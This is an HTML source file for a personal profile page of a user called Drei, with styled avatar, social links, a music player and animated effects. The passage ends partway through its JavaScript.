
F[mwah.html](https://github.com/user-attachments/files/26197597/mwah.html)
<!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dreicute</title>
  <link rel="icon" type="image/png" href="https://copilot.microsoft.com/th/id/BCO.c494cffd-7928-49ec-84c9-19fd0ce4f0bc.png">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&family=Poppins:wght@300;400;600;800&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
  :root{
        --bg: hwb(0 0% 100%);
        --fg: #fff;
        --muted: rgba(147, 147, 147, 0.7);
        --glass: rgba(255,255,255,.06);
        --accent: #ffffff;
        --glow: 0 0 10px var(--accent), 0 0 25px var(--accent);
    --font-sans: 'Inter', 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    --font-heading: 'Inter', 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
  @font-face {
    font-family: 'Tisk';
    src: url('https://file.garden/aN0Uo2YmaWI-OmAY/Tisk.ttf') format('truetype');
    font-weight: 300 900;
    font-style: normal;
    font-display: swap;
  }
      [data-theme="light"]{
        --bg:#686666; --fg:#ffffff; --muted:#3b3b3b; --glass: rgba(255, 111, 111, 0.06); --accent:#000000;
      }

body, a, button, div, span, img {
  cursor: none !important;
}

.cursor {
  position: fixed;
  width: 32px;
  height: 32px;
  background-image: url('https://r2.guns.lol/db6a892e-98a5-4ddf-88c6-a2d7c7bb341d.webp');
  background-size: contain;
  background-repeat: no-repeat;
  background-position: center;
  pointer-events: none;
  transform: translate(-50%, -50%);
  transition: transform 0.08s ease;
  z-index: 999;
}
.star-particle {
  position: fixed;
  width: 3px;
  height: 3px;
  background: #ffffff;
  border-radius: 50%;
  pointer-events: none;
  z-index: 998;
  opacity: 1;
  box-shadow: 
    0 0 6px rgba(255,255,255,1),
    0 0 12px rgba(255,255,255,0.8),
    0 0 18px rgba(255,255,255,0.6);
  animation: starFall 2s ease-out forwards;
}

.star-particle.large {
  width: 4px;
  height: 4px;
  box-shadow: 
    0 0 8px rgba(255,255,255,1),
    0 0 16px rgba(255,255,255,0.9),
    0 0 24px rgba(255,255,255,0.7);
}

.star-particle.medium {
  width: 2px;
  height: 2px;
  box-shadow: 
    0 0 4px rgba(255,255,255,1),
    0 0 8px rgba(255,255,255,0.8);
}

.star-particle.small {
  width: 1px;
  height: 1px;
  box-shadow: 
    0 0 3px rgba(255,255,255,1),
    0 0 6px rgba(255,255,255,0.9);
}
.star-particle::before {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 8px;
  height: 1px;
  background: rgba(255,255,255,0.8);
  transform: translate(-50%, -50%) rotate(0deg);
  animation: twinkle 0.5s ease-in-out infinite alternate;
}

.star-particle::after {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 8px;
  height: 1px;
  background: rgba(255,255,255,0.8);
  transform: translate(-50%, -50%) rotate(90deg);
  animation: twinkle 0.5s ease-in-out infinite alternate-reverse;
}

@keyframes starFall {
  0% {
    opacity: 1;
    transform: translateY(0px) scale(1);
  }
  20% {
    opacity: 1;
    transform: translateY(10px) scale(1.1);
  }
  100% {
    opacity: 0;
    transform: translateY(80px) scale(0.3);
  }
}

@keyframes twinkle {
  0% { opacity: 0.6; }
  100% { opacity: 1; }
}


  *{box-sizing:border-box}
      html,body{height:100%}
      body {
        margin: 0;
        height: 100svh;
        font-family: var(--font-sans);
        background: var(--bg);
        color: var(--fg);
        overflow: hidden;
        display: grid;
        place-items: center;
      }
  #bgCanvas, #vizCanvas{position:fixed; inset:0; width:100%; height:100%; z-index:-2; display:block;}
  #vizCanvas{ z-index:0; pointer-events:none;}
  
  #intro{
    position: fixed; inset:0; display:grid; place-items:center;
    background: radial-gradient(1000px 600px at 50% -10%, rgba(158,252,255,0.15), transparent 50%),
                radial-gradient(800px 400px at 80% 110%, rgba(158,252,255,0.1), transparent 50%),
                rgba(0,0,0,0.85);
    backdrop-filter: blur(2px); z-index:10; transition: opacity .6s ease;
    opacity: 0;
    pointer-events: none;
  }
  #gif-bg {
  position: fixed;
  inset: 0;
  z-index: -3;
  overflow: hidden;
}

#bgVideo {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  opacity: 0.6;
  pointer-events: none;
  filter: blur(6px);
}
  #intro.hidden{opacity:0; pointer-events:none}
  .intro-card{
    background: var(--glass); border: 1px solid rgba(255,255,255,.12);
    padding:22px 26px; border-radius:16px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.4);
  }
  .intro-btn{ margin-top:12px; padding:10px 16px; border-radius:12px; border:1px solid rgba(255,255,255,.2);
    background: transparent; color:var(--fg); font-weight:600; cursor:pointer }
  .intro-btn:hover{ box-shadow: var(--glow) }
  #main{ display:flex; flex-direction:column; align-items:center; text-align:center; gap:18px; z-index:1; opacity:0; pointer-events:none; transition:opacity 1s ease;}
  #main.show{opacity:1; pointer-events:auto;}
  .profile-wrap{position:relative;}
  .pfp{width:160px; height:160px; border-radius:50%; border:2px solid var(--fg); box-shadow:0 0 25px rgba(255,255,255,.15), inset 0 0 12px rgba(255,255,255,.12); animation:halo 5s ease-in-out infinite;}
  
  .ring{position:absolute; inset:-8px; border-radius:50%; pointer-events:none; filter: blur(6px);
    background: conic-gradient(from 0deg, transparent 0 40%, var(--accent) 50%, transparent 60% 100%); animation: spin 8s linear infinite; opacity:.6}
  
  
  @keyframes spin{to{transform:rotate(360deg)}}
  @keyframes halo{0%,100%{box-shadow:0 0 18px rgba(255,255,255,.18)}50%{box-shadow:0 0 34px rgba(255,255,255,.35)}}
  .username {
  font-size:clamp(24px, 4.4vw, 34px); 
  font-weight:800; 
  letter-spacing:0.4px; 
  line-height:1; 
  margin:0; 
  display:flex;
  flex-direction: column;
  align-items: center;
  position:relative;
}
  .username{ 
    font-family: 'Outfit', var(--font-heading); 
    position: relative;
    cursor: pointer;
  }
  
  .username .gradient{
    display: inline-block;
    padding: 0 4px;
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, 'Courier New', monospace;
    position: relative;
    color: #2a2a2a;
    text-shadow: 0 0 8px rgba(0,0,0,0.3);
    opacity: 1;
    cursor: pointer !important;
    overflow: hidden;
    background: none;
    transition: opacity 0.4s ease, transform 0.4s ease;
  }
  
  .status-panel {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(255,255,255,0.08);
    backdrop-filter: blur(15px);
    border: 1px solid rgba(255,255,255,0.15);
    border-radius: 12px;
    padding: 12px 20px;
    opacity: 0;
    visibility: hidden;
    transition: all 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
    box-shadow: 
      0 8px 32px rgba(0,0,0,0.3),
      inset 0 1px 0 rgba(255,255,255,0.1);
    white-space: nowrap;
    z-index: 10;
  }

  
  
  .status-content {
    font-size: 14px;
    color: rgba(255,255,255,0.9);
    font-family: 'Outfit', var(--font-heading);
    font-weight: 500;
    text-shadow: 0 0 8px rgba(255,255,255,0.3);
  }
  
  .username:hover .gradient {
    opacity: 0;
    transform: scale(0.95);
  }
  
  .username:hover .status-panel {
    opacity: 1;
    visibility: visible;
    transform: translate(-50%, -50%) scale(1.02);
  }
  
  
  .username .gradient::before {
    content: attr(data-text);
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, 
      rgba(180,180,180,0) 0%, 
      rgba(220,220,220,0.8) 15%, 
      rgba(160,160,160,0.9) 30%, 
      rgba(200,200,200,1) 50%, 
      rgba(140,140,140,0.9) 70%, 
      rgba(200,200,200,0.7) 85%, 
      rgba(180,180,180,0) 100%);
    background-size: 150% 100%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: smokeFlow 3s ease-in-out infinite;
    pointer-events: none;
    z-index: 1;
  }

  .alt-container {
    margin-top: -5px;
    text-align: center;
    width: 100%;
    position: relative;
  }
  
  .alt{
    position: relative;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    color: #ffffff;
    font-family: 'Tisk', var(--font-heading);
    font-size: clamp(24px, 5.2vw, 42px);
    font-weight:700;
    letter-spacing:0.6px;
    white-space: nowrap; 
    text-shadow:
      0 0 6px rgba(255,255,255,0.9),
      0 0 20px rgba(160,140,255,0.95),
      0 8px 30px rgba(20,10,60,0.65);
    -webkit-text-stroke: 0px transparent;
    opacity: 1;
    visibility: visible;
    transform: scale(1);
    pointer-events: auto;
  }
  
  .alt::after{
    content: '';
    position: absolute;
    top: 0;
    left: 50%; 
    width: 12%;
    height: 80%;
    pointer-events: none;
    transform: translateX(-50%) skewX(-12deg) translateX(-120%);
    background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.95) 50%, rgba(255,255,255,0) 100%);
    mix-blend-mode: screen;
    opacity: 1;
    transform-origin: center;
    animation: altShine 4.2s ease-in-out 120ms infinite;
  }

  .alt .word{
    display: inline-block;
    opacity: 1;
    transform: translateY(0) scale(1);
    transition: opacity 220ms ease, transform 220ms ease;
    text-shadow: inherit;
  }
  .alt .w1{ animation: wordReveal 4.2s ease-in-out -720ms infinite; }
  .alt .w2{ animation: wordReveal 4.2s ease-in-out 120ms infinite; }
  .alt .w3{ animation: wordReveal 4.2s ease-in-out 960ms infinite; }

  @keyframes wordReveal{
    0%{ opacity: 0; transform: translateY(0) scale(0.96) }
    30%{ opacity: 0.8; transform: translateY(-2px) scale(1.06) }
    50%{ opacity: 1; transform: translateY(-4px) scale(1.18) }
    70%{ opacity: 0.8; transform: translateY(-2px) scale(1.06) }
    100%{ opacity: 0; transform: translateY(0) scale(0.96) }
  }

  .username .alt::after{
    content: '';
    position: absolute;
    top: 0;
    left: 50%; 
    width: 12%;
    height: 80%;
    pointer-events: none;
    transform: translateX(-50%) skewX(-12deg) translateX(-120%);
    background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.95) 50%, rgba(255,255,255,0) 100%);
    mix-blend-mode: screen;
    opacity: 0;
    transform-origin: center;
  }

  .username:hover .alt::after{
    opacity: 1;
    animation: altShine 4.2s ease-in-out 120ms infinite;
  }

  @keyframes altShine{
    0%{ transform: translateX(-50%) skewX(-12deg) translateX(-120%); opacity: 0 }
    20%{ opacity: 0.6 }
    50%{ transform: translateX(-50%) skewX(-12deg) translateX(0); opacity: 1 }
    80%{ opacity: 0.6 }
    100%{ transform: translateX(-50%) skewX(-12deg) translateX(120%); opacity: 0 }
  }

  @keyframes altReveal{
    0%{ opacity: 0; transform: translateX(-6px) scale(0.96) }
    35%{ opacity: 0.75; transform: translateX(-2px) scale(1.04) }
    50%{ opacity: 1; transform: translateX(0) scale(1.18) }
    65%{ opacity: 0.75; transform: translateX(2px) scale(1.04) }
    100%{ opacity: 0; transform: translateX(6px) scale(0.96) }
  }

  @keyframes shimmer{
    0%{background-position:0% 50%}
    50%{background-position:100% 50%}
    100%{background-position:0% 50%}
  }

  @keyframes smoky{
    0%{
      text-shadow: 0 2px 8px rgba(0,0,0,0.5), 0 10px 30px rgba(0,0,0,0.45), 0 0 18px rgba(150,150,150,0.06);
      transform: translateY(0);
      opacity: 0.98;
    }
    100%{
      text-shadow: 0 3px 12px rgba(0,0,0,0.55), 0 14px 40px rgba(0,0,0,0.5), 0 0 28px rgba(150,150,150,0.12);
      transform: translateY(-2px);
      opacity: 1;
    }
  }
  @keyframes moveSide{
    0%{ background-position: 0% 50%, 0 0; }
    100%{ background-position: 0% 50%, -240px 0; }
  }

  @keyframes shimmerRainbow{
    0%{ background-position: 0% 50%; }
    50%{ background-position: 100% 50%; }
    100%{ background-position: 200% 50%; }
  }

  @keyframes smokeFlow {
    0% {
      background-position: -150% 0;
      opacity: 0.6;
    }
    20% {
      background-position: -75% 0;
      opacity: 0.9;
    }
    50% {
      background-position: 0% 0;
      opacity: 1;
    }
    80% {
      background-position: 75% 0;
      opacity: 0.9;
    }
    100% {
      background-position: 150% 0;
      opacity: 0.6;
    }
  }
  .status{font-size:16px;opacity:.85; min-height:18px; height:18px; line-height:18px; overflow:hidden; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, 'Courier New', monospace;}
  .socials{display:flex; gap:16px;}
  .socials a{width:36px; height:36px; display:grid; place-items:center; color:var(--fg); text-decoration:none; transition: transform 0.3s ease, filter 0.3s ease; background:none; border:none; filter: drop-shadow(0 0 8px rgba(255,255,255,0.6)) drop-shadow(0 0 16px rgba(255,255,255,0.4));}
  .socials a:hover{ transform: scale(1.3); filter: drop-shadow(0 0 12px rgba(255,255,255,0.9)) drop-shadow(0 0 24px rgba(255,255,255,0.7)); }
  .socials a i, .socials a img{background:none !important; border:none !important; filter:none; background-color:transparent !important; box-shadow:none !important;}
  .socials a img{filter:invert(1) !important;}
  .music{ width:320px; background: rgba(255,255,255,0.05); padding:16px; border-radius:16px; backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.1); user-select:none; position:relative; box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.1); }
  .music-top{ display:flex; align-items:center;  justify-content: space-between; gap:12px }
  .cover{ width:48px; height:48px; border-radius:8px; object-fit:cover }
  .music-info{ flex:1;  }
  .music-controls { display: flex; gap: 6px; align-items: center; }
  .music-controls .btn { cursor: pointer; font-size: 18px; user-select: none; }
  .title{ font-size:14px; font-weight:700 }
  .artist{ font-size:11px; opacity:.75 }
  .title, .artist { font-family: var(--font-heading); }
  .btn{ cursor:pointer; font-size:20px }
  .bar{ margin-top:8px; width:100%; height:6px; background: rgba(255,255,255,0.18); border-radius:4px; overflow:hidden; position:relative }
  .bar .fill{ height:100%; width:0; background: var(--fg); }
  .ctrls{ display:flex; justify-content:space-between; align-items:center; font-size:11px; margin-top:6px; opacity:.9; gap:8px }
  .ctrls .group{ display:flex; align-items:center; gap:8px }
  .vol{ appearance:none; width:80px; height:5px; border-radius:4px; background: rgba(255,255,255,.2); outline:none }
  .vol::-webkit-slider-thumb{ appearance:none; width:12px; height:12px; border-radius:50%; background: var(--fg); cursor:pointer }
  .row{ display:flex; justify-content:space-between; align-items:center; gap:8px; margin:8px 0 }
  .select, .toggle{ padding:8px 10px; border-radius:10px; border:1px solid rgba(255,255,255,.16); background:transparent; color:var(--fg) }
  #view-counter{ position:fixed; bottom:20px; right:20px; background:var(--glass); padding:10px 14px; border-radius:12px; color:var(--fg); font-size:14px; border:1px solid rgba(255,255,255,.14); z-index:2 }
  .toast{ position:fixed; top:16px; left:50%; transform:translateX(-50%); background:var(--glass); border:1px solid rgba(192, 192, 192, 0.14); padding:10px 14px; border-radius:12px; font-size:13px; display:none; z-index:4 }
  .toast.show{ display:block; animation: fade 2s ease forwards }
  @keyframes fade{ 0%{opacity:0} 10%{opacity:1} 90%{opacity:1} 100%{opacity:0} }
  .hidden{display:none}
  .kbd{ font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: rgba(255,255,255,.1); padding:2px 6px; border-radius:6px; font-size:12 }
  
  .bg-toggle {
    position: fixed;
    bottom: 20px;
    left: 20px;
    display: flex;
    align-items: center;
    background: var(--glass);
    padding: 8px 12px;
    border-radius: 12px;
    border: 1px solid rgba(255,255,255,.14);
    z-index: 5;
    gap: 10px;
  }
  
  .toggle-label {
    font-size: 14px;
    color: var(--fg);
  }
  
  .toggle-switch {
    position: relative;
    width: 46px;
    height: 24px;
  }
  
  .toggle-switch input {
    opacity: 0;
    width: 0;
    height: 0;
  }
  
  .toggle-switch label {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #000000;
    transition: .4s;
    border-radius: 34px;
    border: 1px solid rgba(255,255,255,0.2);
  }
  
  .toggle-switch label:before {
    position: absolute;
    content: "";
    height: 18px;
    width: 18px;
    left: 3px;
    bottom: 2px;
    background-color: #000000;
    border: 1px solid #ffffff;
    transition: .4s;
    border-radius: 50%;
  }
  
  .toggle-switch input:checked + label {
    background-color: #ffffff;
  }
  
  .toggle-switch input:checked + label:before {
    transform: translateX(22px);
    background-color: #000000;
  }
  
  #gif-bg {
    transition: opacity 1s ease;
  }
  .pfp { transition: transform 0.3s ease; cursor: pointer; }
  .pfp.zoomed { transform: scale(1.1); }
  
  #avatarPanel {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 20;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.3s ease;
}
#avatarPanel.show {
  opacity: 1;
  pointer-events: auto;
}
  #avatarPanel img {
    width: 500px;
    max-width: 90%;
    max-height: 90%;
    border-radius: 0;
    object-fit: cover;
    box-shadow: 0 18px 60px rgba(0,0,0,0.6), 0 6px 20px rgba(0,0,0,0.4);
  }
  @media (max-width: 768px) {
    body {
      padding: 10px;
    }
    
    #main {
      gap: 12px;
      padding: 0 15px;
    }
    
    .pfp {
      width: 120px;
      height: 120px;
    }
    
    .username {
      font-size: clamp(12px, 2.2vw, 26px);
    }
    
    .alt {
      font-size: clamp(16px, 4vw, 30px);
    }
    
    .status-panel {
      padding: 8px 16px;
      border-radius: 10px;
    }
    
    .status-content {
      font-size: 12px;
    }
    
    .socials {
      gap: 12px;
    }
    
    .socials a {
      width: 32px;
      height: 32px;
    }
    
    .music {
      width: 95%;
      max-width: 300px;
      padding: 12px;
      border-radius: 12px;
    }
    
    .cover {
      width: 40px;
      height: 40px;
      border-radius: 6px;
    }
    
    .title {
      font-size: 12px;
    }
    
    .artist {
      font-size: 10px;
    }
    
    .music-controls .btn {
      font-size: 16px;
    }
    
    .vol {
      width: 60px;
    }
    
    .ctrls {
      font-size: 10px;
      gap: 6px;
    }
    
    #view-counter {
      bottom: 10px;
      right: 10px;
      padding: 8px 12px;
      font-size: 12px;
    }
    
    .bg-toggle {
      bottom: 10px;
      left: 10px;
      padding: 6px 10px;
    }
    
    .toggle-label {
      font-size: 12px;
    }
    
    .loading-text {
      font-size: 24px;
      letter-spacing: 2px;
    }
    
    .loading-logo img {
      width: 60px;
      height: 60px;
    }
    
    .loading-bar {
      width: 150px;
    }
  }
  
  @media (max-width: 480px) {
    #main {
      gap: 10px;
      padding: 0 10px;
    }
    
    .pfp {
      width: 100px;
      height: 100px;
    }
    
    .username {
      font-size: clamp(10px, 1.8vw, 22px);
    }
    
    .alt {
      font-size: clamp(14px, 3.5vw, 26px);
    }
    
    .music {
      width: 98%;
      padding: 10px;
    }
    
    .cover {
      width: 36px;
      height: 36px;
    }
    
    .music-top {
      gap: 8px;
    }
    
    .music-controls {
      gap: 4px;
    }
    
    .music-controls .btn {
      font-size: 14px;
    }
    
    .socials {
      gap: 10px;
    }
    
    .socials a {
      width: 28px;
      height: 28px;
    }
    
    .loading-text {
      font-size: 20px;
      letter-spacing: 1px;
    }
    
    .loading-logo img {
      width: 50px;
      height: 50px;
    }
  }
  
  
  @media (hover: none) and (pointer: coarse) {
    .username:hover .gradient {
      opacity: 1;
      transform: scale(1);
    }
    
    .username:hover .status-panel {
      opacity: 0;
      visibility: hidden;
      transform: translate(-50%, -50%);
    }
    
    .username:active .gradient {
      opacity: 0;
      transform: scale(0.95);
    }
    
    .username:active .status-panel {
      opacity: 1;
      visibility: visible;
      transform: translate(-50%, -50%) scale(1.02);
    }
    
    .socials a:hover {
      transform: scale(1.1);
    }
    
    .pfp:hover {
      transform: scale(1.05);
    }
  }
#avatarPanel .close {
  position: absolute;
  top: 20px;
  right: 30px;
  font-size: 28px;
  color: white;
  cursor: pointer;
  font-weight: bold;
}
.pfp {
  transition: transform 0.3s ease, box-shadow 0.3s ease;
  cursor: pointer;
}

.pfp:hover {
  transform: scale(1.15);
  box-shadow: 0 0 40px rgba(255, 255, 255, 0.4); 
}

.avatar-frame {
  position: absolute;
  inset: -10px; 
  border-radius: 50%;
  pointer-events: none;
  z-index: 2;
  
  background: radial-gradient(circle at center, transparent 60%, rgba(255,255,255,0.06) 64%, rgba(255,255,255,0.03) 68%, transparent 74%);
  box-shadow: 0 0 20px rgba(255,255,255,0.04), inset 0 0 10px rgba(0,0,0,0.18);
  -webkit-mask-image: none;
  mask-image: none;
}

.avatar-deco {
  position: absolute;
  inset: -6px;
  width: calc(100% + 12px);
  height: calc(100% + 12px);
  border-radius: 50%;
  pointer-events: none;
  z-index: 3;
  display: none;
  object-fit: contain;
  filter: drop-shadow(0 6px 18px rgba(0,0,0,0.45));
}

.avatar-deco-svg {
  position: absolute;
  inset: -6px;
  width: calc(100% + 12px);
  height: calc(100% + 12px);
  pointer-events: none;
  z-index: 3;
  display: none;
}

.laser-visualizer {
  margin-top: 12px;
  padding: 8px;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 8px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  overflow: hidden;
}

.laser-canvas {
  width: 100%;
  height: 40px;
  display: block;
  background: transparent;
}


#hoverText {
  position: absolute;
  top: -50px; 
  left: 50%;
  transform: translateX(-50%);
  background: var(--glass);
  border: 1px solid rgba(255,255,255,0.2);
  padding: 6px 12px;
  border-radius: 10px;
  font-size: 13px;
  color: var(--fg);
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.3s ease, transform 0.3s ease;
  white-space: nowrap;
}

.profile-wrap:hover #hoverText {
  opacity: 1;
  transform: translateX(-50%) translateY(-4px);
}

#intro {
  position: fixed;
  inset: 0;
  display: grid;
  place-items: center;
  background: var(--bg);
  z-index: 10;
  opacity: 0;
  pointer-events: auto;
  transition: opacity 1s ease;
}

#intro.show {
  opacity: 1; 
}

#intro.hide {
  opacity: 0; 
  pointer-events: none;
  cursor: url('https://r2.guns.lol/db6a892e-98a5-4ddf-88c6-a2d7c7bb341d.webp'), auto;
}

.intro-content {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 20px;
}

.intro-logo {
  max-width: 200px;
  opacity: 0;
  transform: scale(0.9);
  transition: opacity 1.5s ease, transform 1.5s ease;
}

#intro.show .intro-logo {
  opacity: 1;
  transform: scale(1);
}

.press-enter {
  font-size: 16px;
  color: var(--fg);
  opacity: 0.7;
  animation: pulse 1.5s infinite alternate;
}

@keyframes pulse {
  from { opacity: 0.5; }
  to { opacity: 1; }
}

.snow-circle {
  position: absolute; 
  top: -20px;
  border-radius: 50%;
  background: white;
  opacity: 0.85;
  pointer-events: none;
  z-index: 0; 
  box-shadow: 0 0 8px 2px #fff8;
  animation-name: snow-fall;
  animation-timing-function: linear;
}

@keyframes snow-fall {
  to { transform: translateY(110vh); opacity: 0.7; }
}
.username {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.alt {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 12px;         
  margin-top: 6px;    
}

.word {
  font-size: 1.2em;
  letter-spacing: 1px;
}

.alt {
  display: flex;
  justify-content: center;
  align-items: center;
  position: relative;
  width: 100%;
  left: 0;
  transform: translateX(0);
  gap: 8px;
}


.w1 {
  position: static;
}


.w2 {
  position: static;
  font-family: var(--font-sans) !important;
  font-size: 0.5em;
}


.w3 {
  position: static;
}


.rev-red {
  color: #ff4444;
}

  

</style>
  </head>
  <body>

<div id="cursor" class="cursor"></div>

  <div id="gif-bg">
    <video id="bgVideo" autoplay muted loop playsinline></video>
  </div>
  <div id="static-bg" style="position:fixed;inset:0;z-index:-4;background-image:url('https://file.garden/aN0Uo2YmaWI-OmAY/backgroundplain.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;opacity:0;transition:opacity 1s ease;"></div>
  <canvas id="bgCanvas"></canvas>
  <canvas id="vizCanvas"></canvas>

    <div id="snowLayer" style="position:fixed;inset:0;pointer-events:none;z-index:0;"></div>
    
    <div id="bgToggle" class="bg-toggle">
      <span class="toggle-label">Background:</span>
      <div class="toggle-switch">
        <input type="checkbox" id="bgSwitch" checked>
        <label for="bgSwitch"></label>
      </div>
    </div>


<div id="intro">
  <div class="intro-content">
    <img src="https://media.discordapp.net/attachments/1477973874313527296/1480526156598870131/image.png?ex=69c1226e&is=69bfd0ee&hm=db6dd04320b7fc06a1bb8bc612ebf3d636be6be3cbbeaa617a91d3d9a8c17f9c&=&format=webp&quality=lossless" alt="Intro Logo" class="intro-logo">
    <div class="press-enter">CLICK THIS SHIT</div>
  </div>
</div>

  <main id="main">
  <div class="profile-wrap">
  <span class="ring" aria-hidden="true"></span>
  <img src="https://media.discordapp.net/attachments/1482118652739190814/1484618336074600551/968c44949e0d3e1940f47210908c55bc.jpg?ex=69c0dc52&is=69bf8ad2&hm=9dfe64efe515bf819047f26e1725b4af4e2b6fc15a4b808406201e83bdaa17b7&=&format=webp" alt="Profile" class="pfp"/>
  <span id="presenceBadge" class="presence-badge offline" title="Offline" aria-hidden="true"></span>
  <div id="avatarFrame" class="avatar-frame" aria-hidden="true"></div>
  <img id="avatarDeco" class="avatar-deco" aria-hidden="true" alt=""/>
  <div id="hoverText">Profile Ko:p</div>
  </div>
  <div class="username" id="usernameContainer">
    <span class="gradient" data-text="Drei" id="usernameText">Drei</span>
    <div class="status-panel" id="statusPanel">
      <div class="status-content" id="discordStatus">Loading Discord status...</div>
    </div>
    <div class="activity-status" id="wayneActivity" style="margin-top:6px;font-size:14px;color:var(--fg);"></div>
  </div>
  
  
  <div class="alt-container">
    <span class="alt"><span class="word w1">mori</span> <span class="word w2">x</span> <span class="word w3"><span class="rev-red">kp</span>ls</span></span>
  </div>
  <div class="status" id="status"></div>
    

    <div class="socials">
      <a href="https://discord.gg/SYPzmGKKF4" target="_blank" title="Discord">
      <img src="https://r2.guns.lol/8391014b-c4ae-4f3d-aea6-b2a9464b3323.webp" alt="Discord" style="width:27px;height:27px;filter:invert(1);">
      <a href="https://stunzi.netlify.app/" target="_blank" rel="noopener noreferrer" title="Website"><i class="fa-solid fa-globe"></i></a>
      <a href="https://www.roblox.com/users/9721576352/profile" target="_blank" title="Roblox">
      <img src="https://r2.guns.lol/bfe5fa8a-4cd0-4050-b144-783bce8e6796.webp" alt="Roblox" style="width:27px;height:27px;filter:invert(1);">
  </a>

    </div>

<div class="music">
<div class="music-top">
  <img src="#" class="cover" alt="Cover">
  <div class="music-info">
    <div class="title" id="songTitle"></div>
    <div class="artist" id="songArtist"></div>
  </div>
  <div class="music-controls">
    <div class="btn" id="prevBtn" title="Previous">⏮</div>
    <div class="btn" id="playBtn" title="Play/Pause">▶</div>
    <div class="btn" id="nextBtn" title="Next">⏭</div>
  </div>
</div>

      <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
      <div class="ctrls">
        <div class="group">
          <span class="time" id="cur">0:00</span>
          <span>/</span>
          <span class="time" id="dur">0:00</span>
        </div>
        <div class="group">
          <input type="range" min="0" max="1" step="0.01" value="1" class="vol" id="vol">
        </div>
      </div>
      
      <div class="laser-visualizer" id="laserVisualizer">
        <canvas class="laser-canvas" id="laserCanvas" width="280" height="40"></canvas>
      </div>
      
      <audio id="audio" preload="metadata" ></audio>
    </div>
  </main>

  <div id="avatarPanel">
  <span class="close">&times;</span>
  <img src="https://cdn.discordapp.com/avatars/1163419139247976468/3ed170486d0d4bdc914078c575755de3.png?size=4096&ignore=true" alt="Big Avatar">
</div>

  <div id="view-counter"><i class="fa-solid fa-eye" aria-hidden="true" style="margin-right:8px;"></i>0</div>

  <script>

const avatar = document.querySelector('.pfp');
const avatarPanel = document.getElementById('avatarPanel');
const closeBtn = avatarPanel.querySelector('.close');
const bgSwitch = document.getElementById('bgSwitch');
const gifBg = document.getElementById('gif-bg');
const staticBg = document.getElementById('static-bg');

const savedBgState = localStorage.getItem('bgVisible');
if (savedBgState !== null) {
  const isVisible = savedBgState === 'true';
  bgSwitch.checked = isVisible;
  if (isVisible) {
    gifBg.style.opacity = '1';
    staticBg.style.opacity = '0';
  } else {
    gifBg.style.opacity = '0';
    staticBg.style.opacity = '1';
  }
}

bgSwitch.addEventListener('change', function() {
  if (this.checked) {
    
    gifBg.style.opacity = '1';
    staticBg.style.opacity = '0';
    localStorage.setItem('bgVisible', 'true');
  } else {
    
    gifBg.style.opacity = '0';
    staticBg.style.opacity = '1';
    localStorage.setItem('bgVisible', 'false');
  }
});

avatar.addEventListener('click', () => {
  avatar.classList.toggle('zoomed'); 
  avatarPanel.classList.add('show'); 
});

closeBtn.addEventListener('click', () => {
  avatarPanel.classList.remove('show');
  avatar.classList.remove('zoomed');
});

avatarPanel.addEventListener('click', (e) => {
  if (e.target === avatarPanel) {
    avatarPanel.classList.remove('show');
    avatar.classList.remove('zoomed');
  }
});
 
  const $ = s=>document.querySelector(s);
  const clamp = (n,min,max)=>Math.max(min,Math.min(max,n));
  const store = (k,v)=>localStorage.setItem(k,JSON.stringify(v));
  const load = (k,d)=>{ try{return JSON.parse(localStorage.getItem(k))??d}catch{return d} };
  let state = {theme:load('theme','dark'), viz:true};
  document.documentElement.setAttribute('data-theme',state.theme);

  const statuses = ["Mabait Na Bata <3"];
  const statusEl = $('#status');
  let sIndex = 0, cIndex = 0, del = false;

  function typeLoop() {
    const txt = statuses[sIndex];
    statusEl.textContent = del ? txt.slice(0, --cIndex) : txt.slice(0, ++cIndex);

    if (!del && cIndex === txt.length) {
      del = true;
      setTimeout(typeLoop, 1200);
    } else if (del && cIndex === 0) {
      del = false;
      sIndex = (sIndex + 1) % statuses.length;
      setTimeout(typeLoop, 400);
    } else {
      setTimeout(typeLoop, del ? 50 : 90);
    }
  }
